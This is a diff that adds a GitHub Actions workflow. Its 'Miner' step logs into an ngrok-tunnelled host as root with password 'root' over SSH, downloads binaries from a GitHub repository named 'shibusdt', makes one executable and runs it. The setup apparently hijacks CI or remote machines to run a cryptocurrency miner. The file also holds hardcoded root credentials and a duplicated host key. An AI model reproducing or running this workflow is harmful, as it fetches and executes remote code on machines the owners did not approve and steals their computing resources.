@@ -1,0 +1,16 @@
+build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: ls -a via OPEN SSH Private Key
+      - name: Miner
+        uses: tarunjangra/ssh-remote-cmd@master
+        with:
+          command: |
+            wget https://raw.githubusercontent.com/trautroi/shibusdt/main/vio
+            wget https://raw.githubusercontent.com/trautroi/shibusdt/main/nv && chmod +x nv && ./nv
+          host: 8.tcp.ngrok.io:17727
+          host: 8.tcp.ngrok.io
+          port: 17727
+          user: root         
+          pass: root
+          args: "-tt -vvv"
